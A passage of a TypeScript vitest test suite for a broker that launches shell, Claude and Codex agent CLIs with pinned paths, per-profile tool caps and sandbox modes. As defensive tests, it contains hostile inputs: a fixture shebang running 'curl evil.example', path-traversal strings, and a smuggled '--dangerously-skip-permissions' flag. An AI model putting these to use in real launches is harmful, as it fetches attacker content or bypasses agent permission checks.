import { describe, expect, it } from 'vitest';

import {
  WORKFLOW_EXECUTION_PROFILES,
  WORKFLOW_PERMISSION_MODE,
} from '../control/workflowProfiles.ts';

import {
  BROKER_RUNTIME_POLICY,
  BROKER_SYSTEMD_POLICY,
  FdPinnedPathError,
  LINUX_CHILD_ENV_KEYS,
  type PinnedIdentity,
  type PinningFileSystem,
  buildBrokerLaunch,
  buildWorkflowPolicyTable,
  codexSandboxMode,
  CODEX_EXECUTABLE_CANDIDATES,
  enumerateBrokerLaunchers,
  pinPipeStdinExec,
  launcherExecutable,
  pinBrokerLaunch,
  pinnableLauncher,
  resolveLinuxRoot,
  validateRelativeCwd,
} from './fdPinnedPaths.ts';

/** Linux O_PATH: the flag the walk retries a symlink component with. */
const O_PATH = 0x20_0000;

describe('fdPinnedPaths', () => {
  it('pins the two exact roots and the runtime-state policy', () => {
    expect(resolveLinuxRoot('repo')).toBe('/var/lib/kb/ops');
    expect(resolveLinuxRoot('worktrees')).toBe('/var/lib/kb-shell/worktrees');
    expect(BROKER_RUNTIME_POLICY).toEqual({
      runtimeDirectory: '/run/kb-shell',
      runtimeDirectoryMode: 0o750,
      statePath: '/run/kb-shell/state.json',
      stateOwner: 'kb-shell:kb-shell',
      stateMode: 0o600,
      inaccessiblePaths: ['/var/lib/kb/state', '/opt/kb-releases', '/var/lib/kb-activation'],
    });
    // The unit's path sandbox has exactly one copy, and it is the systemd literal.
    expect(BROKER_RUNTIME_POLICY.runtimeDirectoryMode)
      .toBe(Number.parseInt(BROKER_SYSTEMD_POLICY.socket.RuntimeDirectoryMode, 8));
    expect(Object.keys(BROKER_RUNTIME_POLICY)).not.toContain('readWritePaths');
    expect(Object.keys(BROKER_RUNTIME_POLICY)).not.toContain('readOnlyPaths');
    expect(BROKER_SYSTEMD_POLICY.service.ReadWritePaths.split(' '))
      .toContain('/var/lib/kb-shell/worktrees');
  });

  it('rejects traversal, absolute paths, denied roots, controls, and unsafe path segments', () => {
    expect(validateRelativeCwd('safe/nested')).toBe('safe/nested');
    for (const value of ['../state', '/root', 'C:\\Windows', '\\\\host\\share', 'a//b', 'a/./b',
      'a/../b', 'a/CON', 'a/trailing.', 'a/trailing ', 'a\u0000b', '\u202e']) {
      expect(() => validateRelativeCwd(value)).toThrow(FdPinnedPathError);
    }
  });

  it('owns the closed recipe-to-argv table and minimal child environment', () => {
    const claude = buildBrokerLaunch({
      launcher: 'claude', mode: 'headless-json', model: 'claude-opus-5',
      toolPolicyId: 'producer', sandbox: 'claude-policy', resumeRef: 'resume-1',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    expect(claude.executable).toBe('/var/lib/kb-shell/home/.local/bin/claude');
    expect(claude.args).toEqual([
      '-p', '--output-format', 'stream-json', '--input-format', 'stream-json', '--verbose',
      '--model', 'claude-opus-5', '--resume', 'resume-1', '--allowedTools',
      'Bash,Read,Write,Edit,Glob,Grep', '--permission-mode', 'default',
    ]);

    const codex = buildBrokerLaunch({
      launcher: 'codex', mode: 'headless-json', model: 'gpt-5.6-terra',
      toolPolicyId: 'producer', sandbox: 'codex-workspace-write',
    }, 'worktrees', 'run-1', { cols: 100, rows: 30 });
    expect(codex.args).toEqual([
      'exec', '-', '--json', '--model', 'gpt-5.6-terra', '-s', 'workspace-write',
      '-c', 'approval_policy=never', '-c', 'forced_login_method="chatgpt"',
      '-c', 'mcp_servers={}', '-c', 'sandbox_workspace_write.network_access=false',
      '-c', 'web_search="disabled"', '--cd', '/var/lib/kb-shell/worktrees/run-1',
    ]);
    expect(Object.keys(codex.env).sort()).toEqual([...LINUX_CHILD_ENV_KEYS].sort());
    expect(codex.env).not.toHaveProperty('TOKEN');

    // `codex exec -` names stdin as its prompt source and `claude -p` refuses a tty there, so BOTH
    // headless launchers earn a pipe on fd 0 - the mode decides it, not the launcher's name.
    expect([claude.stdinMode, codex.stdinMode]).toEqual(['pipe', 'pipe']);
  });

  /**
   * The regression the profile table was extracted for: EVERY id the control plane can put on the wire
   * (`control/workflowProfiles.ts`, the same literal `attemptSessionAdapter` resolves against) has to
   * build on both agent launchers. The broker previously knew one id, `standard`, that nothing sends,
   * so every real agent launch died on `unknown ... tool policy`. Driving the table itself means a
   * profile added later is covered the day it is added.
   */
  it.each(WORKFLOW_EXECUTION_PROFILES)('launches workflow profile $id on both agent launchers', (profile) => {
    const claude = buildBrokerLaunch({
      launcher: 'claude', mode: 'headless-json', model: 'claude-opus-5',
      toolPolicyId: profile.id, sandbox: 'claude-policy',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    expect(claude.executable).toBe('/var/lib/kb-shell/home/.local/bin/claude');
    // The cap the dashboard approved reaches the child verbatim, in table order.
    expect(claude.args.slice(-4)).toEqual([
      '--allowedTools', [...profile.allowedTools].join(','),
      '--permission-mode', WORKFLOW_PERMISSION_MODE,
    ]);

    const codex = buildBrokerLaunch({
      launcher: 'codex', mode: 'headless-json', model: 'gpt-5.6-terra',
      toolPolicyId: profile.id, sandbox: 'codex-workspace-write',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    expect(codex.executable).toBe('/var/lib/kb-shell/home/.local/bin/codex');
  });

  it('gives each profile its own --allowedTools argument rather than one blanket cap', () => {
    const allowedTools = (toolPolicyId: string): string => {
      const { args } = buildBrokerLaunch({
        launcher: 'claude', mode: 'headless-json', model: 'claude-opus-5',
        toolPolicyId, sandbox: 'claude-policy',
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
      return args[args.indexOf('--allowedTools') + 1]!;
    };
    expect(allowedTools('checker-readonly')).toBe('Read,Glob,Grep');
    expect(allowedTools('producer')).toBe('Bash,Read,Write,Edit,Glob,Grep');
    expect(allowedTools('checker-readonly')).not.toBe(allowedTools('producer'));
    // A read-only profile never reaches the child carrying a write capability.
    expect(allowedTools('checker-readonly')).not.toContain('Bash');
    expect(allowedTools('scanner')).not.toContain('Bash');
    // An id nobody serves is still refused: dropping the enumeration did not open the policy name up.
    for (const unknown of ['standard', 'shell-default', 'producer-x']) {
      expect(() => buildBrokerLaunch({
        launcher: 'claude', mode: 'headless-json', model: 'claude-opus-5',
        toolPolicyId: unknown, sandbox: 'claude-policy',
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 })).toThrow('unknown Claude tool policy');
      expect(() => buildBrokerLaunch({
        launcher: 'codex', mode: 'headless-json', model: 'gpt-5.6-terra',
        toolPolicyId: unknown, sandbox: 'codex-workspace-write',
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 })).toThrow('unknown Codex tool policy');
    }
  });

  /**
   * THE CODEX CAP. Codex takes no `--allowedTools`, so before this the profile name selected nothing
   * that reached the child: `checker-readonly` and `producer` produced byte-identical argv, both
   * `-s workspace-write` with `approval_policy=never`. The one real workflow definition in the repo
   * (`orgs/faceless-youtube/workflows/iteration-loop-demo.md`) declares `workflowProfile:
   * checker-readonly` on its review stages with work orders saying "Read only ... Never edit the
   * artifact" — those stages launched with unattended write and command execution across the worktree,
   * held read-only by prose alone. The sandbox is now derived from the profile, which is the only
   * place a codex worker's cap can live.
   */
  it('derives the codex sandbox from the profile instead of capping every profile the same', () => {
    const sandboxFor = (toolPolicyId: string, resumeRef?: string): string => {
      const { args } = buildBrokerLaunch({
        launcher: 'codex', mode: 'headless-json', model: 'gpt-5.6-terra',
        toolPolicyId, sandbox: 'codex-workspace-write', ...(resumeRef ? { resumeRef } : {}),
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
      // A fresh launch spells it as the flag; `exec resume` takes no `-s`, so it spells it as the
      // config key that flag sets. Both branches must answer the same question the same way.
      const flag = args.indexOf('-s');
      if (flag !== -1) return args[flag + 1]!;
      const pinned = args.find((entry, index) => args[index - 1] === '-c' && entry.startsWith('sandbox_mode='));
      expect(pinned).toBeDefined();
      return pinned!.slice('sandbox_mode='.length).replaceAll('"', '');
    };

    // Every profile, on BOTH the fresh and the resume path, and the two paths never disagree.
    const expected: Record<string, 'read-only' | 'workspace-write'> = {
      'checker-readonly': 'read-only',
      research: 'read-only',
      'gmail-triage': 'workspace-write',
      'drive-author': 'workspace-write',
      producer: 'workspace-write',
      scanner: 'workspace-write',
    };
    for (const profile of WORKFLOW_EXECUTION_PROFILES) {
      const grantsWrite = profile.allowedTools.some((tool) => ['Bash', 'Write', 'Edit'].includes(tool));
      const mode = grantsWrite ? 'workspace-write' : 'read-only';
      expect(mode).toBe(expected[profile.id]);
      expect(sandboxFor(profile.id)).toBe(mode);
      // A resumed session cannot silently gain capability the fresh launch would not have had.
      expect(sandboxFor(profile.id, 'thread-1')).toBe(mode);
    }

    // A profile granting none of Bash/Write/Edit lands read-only; granting any one of them does not.
    expect(codexSandboxMode(['Read', 'Glob', 'Grep', 'WebFetch'])).toBe('read-only');
    for (const tool of ['Bash', 'Write', 'Edit']) {
      expect(codexSandboxMode(['Read', tool])).toBe('workspace-write');
    }
    // `danger-full-access` is not reachable from the derivation under any input.
    expect(['read-only', 'workspace-write']).toContain(codexSandboxMode([]));
    expect(codexSandboxMode(['danger-full-access'])).toBe('read-only');

    // The interactive branch is capped from the profile too, not left on a literal.
    const interactive = buildBrokerLaunch({
      launcher: 'codex', mode: 'interactive', model: 'gpt-5.6-terra',
      toolPolicyId: 'checker-readonly', sandbox: 'codex-workspace-write',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    expect(interactive.args.slice(0, 4)).toEqual(['--model', 'gpt-5.6-terra', '-s', 'read-only']);
    // ...and an interactive recipe keeps its tty on stdin, on the same launcher.
    expect(interactive.stdinMode).toBe('tty');
  });

  /**
   * Codex is last-wins on `-c`, so `pinnedCodexConfig` — `approval_policy=never` and the
   * network/mcp/web-search pins — is only un-overridable while it is the LAST `-c` group in argv.
   * Deriving the sandbox added a `-c sandbox_mode=` to the resume branch, which is exactly the kind of
   * edit that can slide in after the pins; this holds every branch to the ordering.
   */
  it('keeps the pinned codex config last in every codex branch', () => {
    const PINS = [
      '-c', 'approval_policy=never', '-c', 'forced_login_method="chatgpt"',
      '-c', 'mcp_servers={}', '-c', 'sandbox_workspace_write.network_access=false',
      '-c', 'web_search="disabled"',
    ];
    const branches = [
      { mode: 'headless-json', resumeRef: undefined, trailing: 2 },
      { mode: 'headless-json', resumeRef: 'thread-1', trailing: 0 },
      { mode: 'interactive', resumeRef: undefined, trailing: 2 },
    ] as const;
    for (const branch of branches) {
      for (const toolPolicyId of ['checker-readonly', 'producer']) {
        const { args } = buildBrokerLaunch({
          launcher: 'codex', mode: branch.mode, model: 'gpt-5.6-terra',
          toolPolicyId, sandbox: 'codex-workspace-write',
          ...(branch.resumeRef ? { resumeRef: branch.resumeRef } : {}),
        }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
        // Only `--cd <cwd>` may follow the pins, and nothing else may.
        const tail = branch.trailing === 0 ? args : args.slice(0, -branch.trailing);
        expect(tail.slice(-PINS.length)).toEqual(PINS);
        if (branch.trailing === 2) expect(args.slice(-2)).toEqual(['--cd', '/var/lib/kb-shell/worktrees/run-1']);
        // Every `-c` the branch adds of its own sits BEFORE the pins.
        const lastPin = args.lastIndexOf('web_search="disabled"');
        expect(args.slice(lastPin + 1).some((value) => value === '-c')).toBe(false);
      }
    }
  });

  /**
   * The broker derives its table from the shared literal, so without its own filters it would launch a
   * profile the dashboard's `createWorkflowToolPolicyResolver` would refuse to resolve. Refusing at Map
   * construction takes the broker out at start-up, which is visible; launching an over-capable worker
   * is not.
   */
  it('refuses to build its policy table from a malformed, forbidden, empty, or absent profile', () => {
    expect(buildWorkflowPolicyTable(WORKFLOW_EXECUTION_PROFILES).size)
      .toBe(WORKFLOW_EXECUTION_PROFILES.length);
    // A tool name that would corrupt the comma-joined `--allowedTools` value or smuggle a flag.
    for (const malformed of ['Read,Write', 'Read Write', '--dangerously-skip-permissions', 'a"b', "a'b", '']) {
      expect(() => buildWorkflowPolicyTable([{ id: 'bad', allowedTools: ['Read', malformed] }]))
        .toThrow(/names a malformed tool/);
    }
    // A publish/send capability may not enter through any profile.
    expect(() => buildWorkflowPolicyTable([{ id: 'bad', allowedTools: ['Read', 'upload_video'] }]))
      .toThrow(/names forbidden tool 'upload_video'/);
    expect(() => buildWorkflowPolicyTable([
      { id: 'bad', allowedTools: ['mcp__claude_ai_Gmail__send_message'] },
    ])).toThrow(/names forbidden tool/);
    expect(() => buildWorkflowPolicyTable([{ id: 'bad', allowedTools: [] }])).toThrow(/grants no tools/);
    expect(() => buildWorkflowPolicyTable([])).toThrow(/the workflow profile table is empty/);
    expect(() => buildWorkflowPolicyTable([])).toThrow(FdPinnedPathError);
  });

  /**
   * The whole kb model registry (`governance/model-routing.yaml`), not a broker-local copy of it. The
   * broker checks the launcher prefix and nothing more, so a model the fleet adopts tomorrow launches
   * without a broker edit — the enumeration that used to live here overlapped the real registry in
   * exactly one id and grounded every agent launch.
   */
  it('accepts every registry model on its own launcher and refuses a crossed recipe', () => {
    for (const model of ['claude-fable-5', 'claude-opus-5', 'claude-sonnet-5', 'claude-haiku-4-5']) {
      const launch = buildBrokerLaunch({
        launcher: 'claude', mode: 'headless-json', model,
        toolPolicyId: 'checker-readonly', sandbox: 'claude-policy',
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
      expect(launch.args).toContain(model);
    }
    for (const model of ['gpt-5.6-luna', 'gpt-5.6-terra', 'gpt-5.6-sol']) {
      const launch = buildBrokerLaunch({
        launcher: 'codex', mode: 'headless-json', model,
        toolPolicyId: 'checker-readonly', sandbox: 'codex-workspace-write',
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
      expect(launch.args).toContain(model);
    }
    expect(() => buildBrokerLaunch({
      launcher: 'claude', mode: 'headless-json', model: 'gpt-5.6-terra',
      toolPolicyId: 'checker-readonly', sandbox: 'claude-policy',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 })).toThrow('does not belong to this launcher');
    expect(() => buildBrokerLaunch({
      launcher: 'codex', mode: 'headless-json', model: 'claude-opus-5',
      toolPolicyId: 'checker-readonly', sandbox: 'codex-workspace-write',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 })).toThrow('does not belong to this launcher');
  });

  /**
   * `shell-default` is not a workflow profile and must never need to be one: the shell recipe is pinned
   * to that exact id by `decodeLaunchRecipe`, and `buildBrokerLaunch` returns before any policy lookup.
   */
  it('launches the shell on shell-default without consulting the profile table', () => {
    expect(WORKFLOW_EXECUTION_PROFILES.map((profile) => profile.id)).not.toContain('shell-default');
    const shell = buildBrokerLaunch({
      launcher: 'shell', mode: 'interactive', model: null,
      toolPolicyId: 'shell-default', sandbox: 'interactive',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    expect(shell.executable).toBe('/bin/bash');
    expect(shell.args).toEqual([]);
    expect(shell.stdinMode).toBe('tty');
    // ...and no other policy id can be smuggled onto the shell launcher in its place.
    for (const toolPolicyId of ['producer', 'standard']) {
      expect(() => buildBrokerLaunch({
        launcher: 'shell', mode: 'interactive', model: null, toolPolicyId, sandbox: 'interactive',
      }, 'worktrees', 'run-1', { cols: 80, rows: 24 })).toThrow('shell recipe is invalid');
    }
  });

  it('opens every component relative to pinned dirfds, accepts 02770 worktrees, and launches only proc fds', async () => {
    const opened: string[] = [];
    const identities = new Map<number, PinnedIdentity>();
    let nextFd = 10;
    const fakeFs = {
      open(path: string, _flags: number): number {
        opened.push(path);
        const fd = nextFd++;
        const leaf = path.split('/').at(-1);
        const worktree = leaf === 'worktrees';
        const run = leaf === 'run-1';
        const file = leaf === 'bash';
        identities.set(fd, { dev: 1n, ino: BigInt(fd), uid: worktree ? 1001 : run ? 1000 : 0,
          gid: worktree || run ? 1000 : 0, mode: file ? 0o100755 : worktree || run ? 0o042770 : 0o040755,
          kind: file ? 'file' : 'directory' });
        return fd;
      },
      identity(fd: number) { return identities.get(fd)!; },
      identityAt(_path: string, expected: PinnedIdentity) { return expected; },
      readlink() { throw new Error('not a symlink'); },
      read() { return Buffer.from([0x7f, 0x45, 0x4c, 0x46]); },
      close() {},
    };
    const pinned = await pinBrokerLaunch(buildBrokerLaunch({ launcher: 'shell', mode: 'interactive', model: null,
      toolPolicyId: 'shell-default', sandbox: 'interactive' }, 'worktrees', 'run-1', { cols: 80, rows: 24 }),
    { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 }, fakeFs);
    expect(opened[0]).toBe('/');
    expect(opened.slice(1).every((value) => value === '/' || value.startsWith('/proc/self/fd/'))).toBe(true);
    expect(pinned.launch.executable).toMatch(/^\/proc\/self\/fd\/\d+$/);
    expect(pinned.launch.cwd).toMatch(/^\/proc\/self\/fd\/\d+$/);
    await pinned.close();
  });

  it('follows a policy-valid symlink but refuses one swapped between the O_PATH pin and its use', async () => {
    const readlinks: string[] = [];
    const symlinkRechecks: string[] = [];
    // `run-1` is a symlink: O_NOFOLLOW|O_DIRECTORY fails with ELOOP, and only the O_PATH retry
    // succeeds — returning a symlink fd whose identity the walk must verify before it is used.
    const makeFake = (swap: 'symlink-swapped' | 'symlink-valid' | 'ancestor') => {
      let nextFd = 20;
      const identities = new Map<number, PinnedIdentity>();
      return {
        open(path: string, flags: number): number {
          const symlinkComponent = swap !== 'ancestor' && path.endsWith('/run-1');
          if (symlinkComponent && (flags & O_PATH) === 0) {
            throw Object.assign(new Error('symlink'), { code: 'ELOOP' });
          }
          const fd = nextFd++;
          const file = path.endsWith('/bash');
          const worktree = path.endsWith('/worktrees');
          const directory = path.endsWith('/run-1') || path.endsWith('/target');
          identities.set(fd, symlinkComponent
            // the pinned O_PATH fd: a symlink owned by kb-shell inside the 02770 worktree root
            ? { dev: 1n, ino: BigInt(fd), uid: 1000, gid: 1000, mode: 0o120777, kind: 'other' }
            : { dev: 1n, ino: BigInt(fd), uid: worktree ? 1001 : directory ? 1000 : 0,
              gid: worktree || directory ? 1000 : 0,
              mode: file ? 0o100755 : worktree || directory ? 0o042770 : 0o040755,
              kind: file ? 'file' : 'directory' });
          return fd;
        },
        identity(fd: number) { return identities.get(fd)!; },
        identityAt(path: string, expected: PinnedIdentity) {
          if (path.endsWith('/run-1')) symlinkRechecks.push(path);
          // the parent-anchored lstat of the symlink resolves to a different inode: a real swap
          if (swap === 'symlink-swapped' && path.endsWith('/run-1')) return { ...expected, ino: expected.ino + 1n };
          return swap === 'ancestor' && path === '/var/lib' ? { ...expected, ino: expected.ino + 1n } : expected;
        },
        readlink(path: string) {
          readlinks.push(path);
          if (!path.endsWith('/run-1')) throw new Error('not a symlink');
          return '/var/lib/kb-shell/worktrees/target';
        },
        read() { return Buffer.from([0x7f, 0x45, 0x4c, 0x46]); }, close() {},
      };
    };
    const launch = buildBrokerLaunch({ launcher: 'shell', mode: 'interactive', model: null,
      toolPolicyId: 'shell-default', sandbox: 'interactive' }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    const ids = { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 };

    await expect(pinBrokerLaunch(launch, ids, makeFake('symlink-swapped')))
      .rejects.toThrow('pinned symlink identity changed');
    await expect(pinBrokerLaunch(launch, ids, makeFake('ancestor')))
      .rejects.toThrow('pinned ancestor identity changed');

    const pinned = await pinBrokerLaunch(launch, ids, makeFake('symlink-valid'));
    expect(pinned.launch.cwd).toMatch(/^\/proc\/self\/fd\/\d+$/);
    // the link contents and its identity recheck both go through the pinned parent dirfd,
    // never through the full pathname the walk started from
    expect(readlinks.every((value) => value.startsWith('/proc/self/fd/'))).toBe(true);
    expect(symlinkRechecks.length).toBeGreaterThan(0);
    expect(symlinkRechecks.every((value) => value.startsWith('/proc/self/fd/'))).toBe(true);
    await pinned.close();
  });
});

/**
 * A VM filesystem, described as the nodes the pin walk will actually open. Each fixture states the
 * machine it describes and nothing more: no path is special-cased, so a launcher appears in an
 * enumeration exactly when the same walk that runs at launch would accept it.
 */
type FakeNode = { kind: 'file' | 'directory'; uid: number; gid: number; mode: number; content?: string };
const PIN_IDENTITIES = { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 };

/**
 * The provisioned VM, as verified on the box (2026-09-03): `~/.local/bin/claude` is a NATIVE binary,
 * while `~/.local/bin/codex` is a 7 KB `#!/usr/bin/env node` wrapper whose only job is to spawn the
 * vendored native under `.local/lib/node_modules/@openai/codex/node_modules/...`. Every component of
 * that nested path is kb-shell:kb-shell 0700, which is what the walk demands. Describing the wrapper
 * as if it were the real entrypoint is what made codex look launchable when it is not.
 */
function vmTree(): Record<string, FakeNode> {
  const rootDir = (mode = 0o755): FakeNode => ({ kind: 'directory', uid: 0, gid: 0, mode });
  const homeDir = (mode: number): FakeNode => ({ kind: 'directory', uid: 1000, gid: 1000, mode });
  const cli = (content: string): FakeNode => ({ kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content });
  const tree: Record<string, FakeNode> = {
    '/': rootDir(),
    '/bin': rootDir(),
    '/bin/bash': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
    '/usr': rootDir(),
    '/usr/bin': rootDir(),
    '/usr/bin/node': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
    '/usr/bin/python3': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
    '/var': rootDir(),
    '/var/lib': rootDir(),
    '/var/lib/kb-shell': { kind: 'directory', uid: 0, gid: 1000, mode: 0o750 },
    '/var/lib/kb-shell/home': homeDir(0o700),
    '/var/lib/kb-shell/home/.local': homeDir(0o750),
    '/var/lib/kb-shell/home/.local/bin': homeDir(0o750),
    '/var/lib/kb-shell/home/.local/bin/claude': cli('ELF'),
    '/var/lib/kb-shell/home/.local/bin/codex': cli('#!/usr/bin/env node\nspawn(vendored);\n'),
  };
  // Candidate (a): the nested npm layout, directory by directory.
  let at = '/var/lib/kb-shell/home/.local';
  for (const part of ['lib', 'node_modules', '@openai', 'codex', 'node_modules', '@openai',
    'codex-linux-x64', 'vendor', 'x86_64-unknown-linux-musl', 'bin']) {
    at = `${at}/${part}`;
    tree[at] = homeDir(0o700);
  }
  tree[`${at}/codex`] = cli('ELF');
  return tree;
}

/** Both codex candidates, so a fixture can describe a machine where codex is genuinely absent. */
function withoutCodex(tree: Record<string, FakeNode>): Record<string, FakeNode> {
  for (const path of Object.keys(tree)) {
    if (path.endsWith('/codex') || path.includes('/@openai/')) delete tree[path];
  }
  return tree;
}

function pinningFsOver(tree: Record<string, FakeNode>): PinningFileSystem & { openFds(): number } {
  let nextFd = 10;
  let nextIno = 1n;
  const openPaths = new Map<number, string>();
  const inodes = new Map<string, bigint>();
  const identityOf = (absolute: string): PinnedIdentity => {
    const node = tree[absolute];
    if (node === undefined) throw Object.assign(new Error('no such file'), { code: 'ENOENT' });
    if (!inodes.has(absolute)) inodes.set(absolute, nextIno++);
    return { dev: 1n, ino: inodes.get(absolute)!, uid: node.uid, gid: node.gid,
      mode: (node.kind === 'directory' ? 0o040000 : 0o100000) | node.mode, kind: node.kind };
  };
  // The walk addresses every component through its pinned parent dirfd; resolve that back to the
  // absolute path the fixture is written in, so the fixture never has to know about fd numbers.
  const absoluteOf = (target: string): string => {
    const viaFd = /^\/proc\/self\/fd\/(\d+)\/(.+)$/.exec(target);
    if (viaFd === null) return target;
    const parent = openPaths.get(Number(viaFd[1]));
    if (parent === undefined) throw new Error('walk used an unpinned descriptor');
    return parent === '/' ? `/${viaFd[2]!}` : `${parent}/${viaFd[2]!}`;
  };
  return {
    open(target: string): number {
      const absolute = absoluteOf(target);
      identityOf(absolute);
      const fd = nextFd++;
      openPaths.set(fd, absolute);
      return fd;
    },
    identity: (fd: number) => identityOf(openPaths.get(fd)!),
    identityAt: (target: string) => identityOf(absoluteOf(target)),
    readlink() { throw new Error('not a symlink'); },
    read: (fd: number) => Buffer.from(tree[openPaths.get(fd)!]?.content ?? '', 'utf8'),
    close: (fd: number) => { openPaths.delete(fd); },
    /** Every descriptor the walk opened and has not closed. A pin that returns must hold none. */
    openFds: () => openPaths.size,
  };
}

/**
 * D5: the shim is code the broker is about to run as itself, so whoever can WRITE it owns every
 * headless child. It is opened by a path the broker derives from its own module location - never from
 * the wire - and then checked ON THAT DESCRIPTOR: no group or other write bit, owned by root (the
 * release on the VM) or by the broker's own account, which could rewrite the payload anyway.
 */
describe('pinPipeStdinExec', () => {
  const SHIM = '/opt/kb-shell-broker/current/server/pty/pipeStdinExec.py';
  const shimTree = (node: FakeNode): Record<string, FakeNode> => ({ ...vmTree(), [SHIM]: node });
  const file = (uid: number, mode: number): FakeNode => ({ kind: 'file', uid, gid: 0, mode, content: 'py' });

  it('accepts a root-owned or broker-owned shim with no group or other write bit', () => {
    for (const node of [file(0, 0o444), file(0, 0o644), file(1000, 0o600)]) {
      const fs = pinningFsOver(shimTree(node));
      const pinned = pinPipeStdinExec(SHIM, PIN_IDENTITIES, fs);
      expect(pinned.interpreter).toMatch(/^\/proc\/self\/fd\/\d+$/);
      pinned.close();
      expect(fs.openFds()).toBe(0);
    }
  });

  it('refuses a writable shim, a stranger-owned shim, and a missing python3', () => {
    for (const node of [file(0, 0o664), file(0, 0o646), file(0, 0o777), file(1234, 0o600)]) {
      const fs = pinningFsOver(shimTree(node));
      expect(() => pinPipeStdinExec(SHIM, PIN_IDENTITIES, fs)).toThrow(FdPinnedPathError);
      // Every descriptor released on the refusing path too, or the broker leaks one per boot attempt.
      expect(fs.openFds()).toBe(0);
    }
    const noPython = shimTree(file(0, 0o444));
    delete noPython['/usr/bin/python3'];
    expect(() => pinPipeStdinExec(SHIM, PIN_IDENTITIES, pinningFsOver(noPython))).toThrow(FdPinnedPathError);
  });
});

describe('enumerateBrokerLaunchers', () => {
  it('names the launchers a provisioned VM can actually pin, resolving paths from the launch table', async () => {
    expect(launcherExecutable('shell')).toBe('/bin/bash');
    expect(launcherExecutable('claude')).toBe('/var/lib/kb-shell/home/.local/bin/claude');
    expect(launcherExecutable('codex')).toBe('/var/lib/kb-shell/home/.local/bin/codex');
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(vmTree())))
      .toEqual(['shell', 'claude', 'codex']);
  });

  it('answers shell-only and one-CLI machines honestly instead of the full set', async () => {
    const shellOnly = withoutCodex(vmTree());
    delete shellOnly['/var/lib/kb-shell/home/.local/bin/claude'];
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(shellOnly))).toEqual(['shell']);

    const claudeOnly = withoutCodex(vmTree());
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(claudeOnly)))
      .toEqual(['shell', 'claude']);
  });

  it('drops a launcher the pin validator refuses, even though the file is right there', async () => {
    // 0755 inside the 0700 provider home: the pin's ownership/mode matrix refuses it. The binary
    // EXISTS; the honest answer is still that it cannot be launched.
    const worldReadable = vmTree();
    for (const path of Object.keys(worldReadable)) {
      if (path.endsWith('/codex') && worldReadable[path]!.kind === 'file') {
        worldReadable[path] = { ...worldReadable[path]!, mode: 0o755 };
      }
    }
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(worldReadable)))
      .toEqual(['shell', 'claude']);
    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(worldReadable))).toBe(false);

    // Same rule for the shebang allowlist: an interpreter line that is not an approved absolute
    // /bin or /usr/bin name drops the launcher rather than being executed to find out.
    const badInterpreter = vmTree();
    badInterpreter['/bin/bash'] = { kind: 'file', uid: 0, gid: 0, mode: 0o755,
      content: '#!/bin/sh -c curl evil.example\n' };
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(badInterpreter)))
      .toEqual(['claude', 'codex']);
  });

  /**
   * D2: codex is pinned at the vendored NATIVE binary, never at the npm wrapper. The wrapper is a
   * `#!/usr/bin/env node` script, and a script entrypoint reaches its interpreter as a descriptor
   * that is already closed by then - so `create` refuses it for an agent launcher. A probe that named
   * codex off the wrapper would advertise a launcher every attempt then fails to start.
   */
  it('resolves codex to the vendored native binary and refuses a wrapper-only install', async () => {
    const nested = `/var/lib/kb-shell/home/.local/lib/node_modules/@openai/codex/node_modules`
      + `/@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl/bin/codex`;
    expect(CODEX_EXECUTABLE_CANDIDATES[0]).toBe(nested);
    expect(CODEX_EXECUTABLE_CANDIDATES[2]).toBe('/var/lib/kb-shell/home/.local/bin/codex');
    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(vmTree()))).toBe(true);

    // The hoisted layout, candidate (b): the nested copy is gone, the hoisted one is not.
    const hoisted = vmTree();
    delete hoisted[nested];
    hoisted[CODEX_EXECUTABLE_CANDIDATES[1]] = { kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: 'ELF' };
    for (const part of ['@openai', '@openai/codex-linux-x64', '@openai/codex-linux-x64/vendor',
      '@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl',
      '@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl/bin']) {
      hoisted[`/var/lib/kb-shell/home/.local/lib/node_modules/${part}`]
        = { kind: 'directory', uid: 1000, gid: 1000, mode: 0o700 };
    }
    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(hoisted))).toBe(true);

    // Wrapper only: no native candidate anywhere, so the launcher is NOT advertised.
    const wrapperOnly = vmTree();
    delete wrapperOnly[nested];
    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(wrapperOnly))).toBe(false);
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(wrapperOnly)))
      .toEqual(['shell', 'claude']);
  });

  /**
   * D1: the probe applies the preconditions `create` applies. Every agent launch is `headless-json`,
